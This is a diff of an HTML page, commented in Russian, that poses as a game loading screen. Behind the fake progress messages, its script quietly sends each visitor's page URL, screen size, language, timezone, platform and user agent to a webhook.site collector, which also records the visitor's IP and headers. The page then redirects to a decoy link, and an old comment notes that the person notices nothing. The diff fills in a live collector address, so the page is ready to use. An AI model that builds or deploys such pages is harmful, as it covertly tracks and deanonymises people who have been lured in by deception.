@@ -11,35 +11,55 @@
   .spin{width:48px;height:48px;border:4px solid #333;border-top-color:#2a6;
         border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
   @keyframes s{to{transform:rotate(360deg)}}
+  p{opacity:.8;font-size:15px}
 </style>
 </head>
 <body>
 <div class="box">
   <div class="spin"></div>
-  <p>Загружаем игру...</p>
+  <p id="msg">Загружаем игру...</p>
 </div>
 
 <script>
-// замени на свой webhook URL (webhook.site и т.п.)
-const HOOK = "https://webhook.site/ТВОЙ-UUID";
+// ==== ТВОЙ ПРИЁМНИК ====
+const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
 
-// 1) шлём «пинг» — webhook запишет IP, UA, заголовки
+// ==== КУДА РЕДИРЕКТИТЬ ПОСЛЕ ====
+// замени на свою страницу/игру/видео
+const REDIRECT_TO = "https://example.com";
+
+// ==== ЧЕРЕЗ СКОЛЬКО СЕКУНД РЕДИРЕКТ ====
+const DELAY_SEC = 3;
+
+// ---- 1. пинг на webhook: IP, UA, экран, язык, таймзона ----
 fetch(HOOK, {
   method: "POST",
-  mode: "no-cors",              // не падаем на CORS, ответ нам не нужен
+  mode: "no-cors",
   headers: {"Content-Type": "text/plain"},
   body: JSON.stringify({
     event: "visit",
     page: location.href,
     ts: new Date().toISOString(),
-    screen: `${screen.width}x${screen.height}`,
+    screen: screen.width + "x" + screen.height,
     lang: navigator.language,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    platform: navigator.platform,
+    ua: navigator.userAgent
   })
-}).catch(()=>{});
+}).catch(function(){});
 
-// 2) через 3 секунды «игра» открывается — человек ничего не заметил
-setTimeout(() => { location.href = "https://example.com/игра"; }, 3000);
+// ---- 2. лёгкий прогресс, чтобы не выглядело пусто ----
+var msg = document.getElementById("msg");
+var steps = ["Загружаем игру...", "Подключаемся...", "Почти готово..."];
+var i = 0;
+var tick = setInterval(function(){
+  i++;
+  if (i < steps.length) msg.textContent = steps[i];
+  else clearInterval(tick);
+}, Math.max(700, Math.floor(DELAY_SEC * 1000 / steps.length)));
+
+// ---- 3. редирект ----
+setTimeout(function(){ location.href = REDIRECT_TO; }, DELAY_SEC * 1000);
 </script>
 </body>
 </html>
